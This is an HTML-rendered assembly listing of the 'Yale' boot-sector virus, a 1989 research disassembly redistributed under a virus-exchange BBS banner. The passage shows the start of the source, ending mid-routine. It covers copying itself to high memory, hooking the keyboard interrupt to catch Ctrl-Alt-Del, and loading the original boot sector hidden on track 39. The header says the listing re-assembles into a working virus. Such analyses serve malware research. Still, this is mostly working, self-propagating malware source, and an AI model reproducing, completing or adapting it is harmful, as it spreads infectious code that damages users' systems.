<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Boot.Yale.a - YALE-ASM.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=] For All Your H/P/A/V Files [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]    SysOp: Peter Venkman    [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;</span><span class="sc0">
</span><span class="sc1">; Around Among the General Public. It Will be Very Useful for Learning how   ;</span><span class="sc0">
</span><span class="sc1">; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;</span><span class="sc0">
</span><span class="sc1">; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;</span><span class="sc0">
</span><span class="sc1">; Experience can Turn it Into a far More Malevolent Program Than it Already  ;</span><span class="sc0">
</span><span class="sc1">; Is. Keep This Code in Responsible Hands!                                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
    </span><span class="sc9">page</span><span class="sc0">    </span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
    </span><span class="sc9">title</span><span class="sc0">   </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc12">'Yale'</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc1">; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป</span><span class="sc0">
</span><span class="sc1">; บ                 British Computer Virus Research Centre                   บ</span><span class="sc0">
</span><span class="sc1">; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ</span><span class="sc0">
</span><span class="sc1">; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                            The 'Yale' Virus                              บ</span><span class="sc0">
</span><span class="sc1">; บ                Disassembled by Joe Hirst,      April 1989                บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                      Copyright (c) Joe Hirst 1989.                       บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ      This listing is only to be made available to virus researchers      บ</span><span class="sc0">
</span><span class="sc1">; บ                or software writers on a need-to-know basis.              บ</span><span class="sc0">
</span><span class="sc1">; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ</span><span class="sc0">

    </span><span class="sc1">; The virus consists of a boot sector only on a floppy disk.</span><span class="sc0">
    </span><span class="sc1">; The original boot sector is kept at track thirty-nine, head zero,</span><span class="sc0">
    </span><span class="sc1">; sector eight.</span><span class="sc0">

    </span><span class="sc1">; The disassembly has been tested by re-assembly using MASM 5.0</span><span class="sc0">
    </span><span class="sc1">; Note that this does not create an identical program, as the original</span><span class="sc0">
    </span><span class="sc1">; appears to have been assembled with A86</span><span class="sc0">

    </span><span class="sc1">; MASM would not assemble the instruction at offset 003CH (7C3CH)</span><span class="sc0">
    </span><span class="sc1">; This instruction is undefined on an 8088/8086, and illegal</span><span class="sc0">
    </span><span class="sc1">; on a 80286/80386.</span><span class="sc0">

    </span><span class="sc1">; The program requires an origin address of 7C00H for the first sector</span><span class="sc0">
    </span><span class="sc1">; to load and run as a boot sector</span><span class="sc0">

    </span><span class="sc1">; System variables are defined in either RAM or BOOT (or both)</span><span class="sc0">
    </span><span class="sc1">; depending on the segment used by the program</span><span class="sc0">

</span><span class="sc5">RAM</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">400H</span><span class="sc0">

    </span><span class="sc1">; System RAM fields</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc0">
</span><span class="sc5">BW0413</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Total RAM size</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">17H</span><span class="sc0">
</span><span class="sc5">BB0417</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Key toggles</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">72H</span><span class="sc0">
</span><span class="sc5">BW0472</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; System reset word</span><span class="sc0">

</span><span class="sc5">RAM</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">BOOT</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc1">; Interrupt addresses</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">24H</span><span class="sc0">
</span><span class="sc5">BW0024</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 9 offset</span><span class="sc0">
</span><span class="sc5">BW0026</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 9 segment</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">64H</span><span class="sc0">
</span><span class="sc5">BW0064</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 19H offset</span><span class="sc0">
</span><span class="sc5">BW0066</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 19H segment</span><span class="sc0">

    </span><span class="sc1">; System RAM fields</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">410H</span><span class="sc0">
</span><span class="sc5">DW0410</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; System configuration</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">413H</span><span class="sc0">
</span><span class="sc5">DW0413</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Total RAM size</span><span class="sc0">

    </span><span class="sc1">; BIOS field</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">0E502H</span><span class="sc0">
</span><span class="sc5">DWE502</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">BOOT</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CLI</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Set SS to zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">7C00H</span><span class="sc0">        </span><span class="sc1">; Set stack before boot area</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0040H</span><span class="sc0">        </span><span class="sc1">; \ Address RAM area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0413</span><span class="sc0">       </span><span class="sc1">; Get size of RAM</span><span class="sc0">
    </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; Convert to paragraphs</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">07E0H</span><span class="sc0">        </span><span class="sc1">; Subtract address after boot area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Target segment</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">3456H</span><span class="sc0">        </span><span class="sc1">; Simulated system reset?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0010</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc5">GENNUM</span><span class="sc4">[</span><span class="sc2">7C00H</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Decrement generation number</span><span class="sc0">
</span><span class="sc5">BP0010</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">           </span><span class="sc1">; \ Address boot sector area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0200H</span><span class="sc0">        </span><span class="sc1">; 512 bytes to move</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Copy virus to high core</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Address offset zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">7B80H</span><span class="sc0">        </span><span class="sc1">; Address interrupt save area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0080H</span><span class="sc0">        </span><span class="sc1">; 128 bytes to move</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Save first 32 interrupt pointers</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0030</span><span class="sc0">          </span><span class="sc1">; Install interrupt 9 routine</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; \ Transfer to high core</span><span class="sc0">
</span><span class="sc1">;   POP CS          ; /</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0FH</span><span class="sc0">         </span><span class="sc1">; This is the previous instruction</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">           </span><span class="sc1">; Address boot sector area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; A-drive, head zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2708H</span><span class="sc0">        </span><span class="sc1">; Track 39, sector 8</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201H</span><span class="sc0">        </span><span class="sc1">; Read one sector</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc0">         </span><span class="sc1">; Disk I/O</span><span class="sc0">
</span><span class="sc5">BP0020</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0020</span><span class="sc0">          </span><span class="sc1">; Loop on error</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0190</span><span class="sc0">

    </span><span class="sc1">; Install interrupt 9 routine</span><span class="sc0">

</span><span class="sc5">BP0030</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc5">DW0413</span><span class="sc0">          </span><span class="sc1">; Decrement RAM size</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BW0024</span><span class="sc0">    </span><span class="sc1">; Address INT 9 pointer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_09</span><span class="sc4">+</span><span class="sc2">7C00H</span><span class="sc0">  </span><span class="sc1">; Target far jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; 4 bytes to copy</span><span class="sc0">
    </span><span class="sc6">CLI</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Copy far address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0024</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0050</span><span class="sc4">+</span><span class="sc2">7C00H</span><span class="sc0"> </span><span class="sc1">; Install new offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0026</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; Install new segment</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Ctrl-Alt-Del depressed - acknowledge keyboard signal</span><span class="sc0">

</span><span class="sc5">BP0040</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">61H</span><span class="sc0">          </span><span class="sc1">; Get port B</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Save current state</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">; Turn top bit on</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; Set port B</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; Get original state</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; Reset port B</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0110</span><span class="sc0">

    </span><span class="sc1">; Format table for track 39, head zero, 8 sectors (unused)</span><span class="sc0">

    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">

    </span><span class="sc1">; Rubbish</span><span class="sc0">

    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">024H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ADH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A3H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">026H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">059H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">05FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">011H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011H</span><span class="sc0">

    </span><span class="sc1">; Interrupt 9 routine</span><span class="sc0">

</span><span class="sc5">BP0050</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSHF</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">KYSTAT</span><span class="sc4">[</span><span class="sc2">7C00H</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get Ctrl &amp; Alt key states</span><span class="sc0">
    </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">60H</span><span class="sc0">          </span><span class="sc1">; Get keyboard token</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Save keyboard token</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">887FH</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1DH</span><span class="sc0">          </span><span class="sc1">; Was key Ctrl?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0060</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; Save Ctrl key state</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0080</span><span class="sc0">

</span><span class="sc5">BP0060</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">38H</span><span class="sc0">          </span><span class="sc1">; Was key Alt?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0070</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; Save Alt key state</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0080</span><span class="sc0">

</span><span class="sc5">BP0070</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0808H</span><span class="sc0">        </span><span class="sc1">; Are Ctrl &amp; Alt depressed?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0080</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">17H</span><span class="sc0">          </span><span class="sc1">; Is key I?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0100</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">53H</span><span class="sc0">          </span><span class="sc1">; Is key Del?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0040</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
</span><span class="sc5">BP0080</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">KYSTAT</span><span class="sc4">[</span><span class="sc2">7C00H</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">    </span><span class="sc1">; Save Ctrl &amp; Alt key states</span><span class="sc0">
</span><span class="sc5">BP0090</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump to original INT 9</span><span class="sc0">
</span><span class="sc5">INT_09</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0E987H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000H</span><span class="sc0">

    </span><span class="sc1">; Pass on Ctrl-Alt-I</span><span class="sc0">

</span><span class="sc5">BP0100</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0240</span><span class="sc0">          </span><span class="sc1">; Ctrl-Alt-I</span><span class="sc0">

    </span><span class="sc1">; Ctrl-Alt-Del depressed - main processing</span><span class="sc0">

</span><span class="sc5">BP0110</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">03D8H</span><span class="sc0">        </span><span class="sc1">; VDU mode control address</span><span class="sc0">
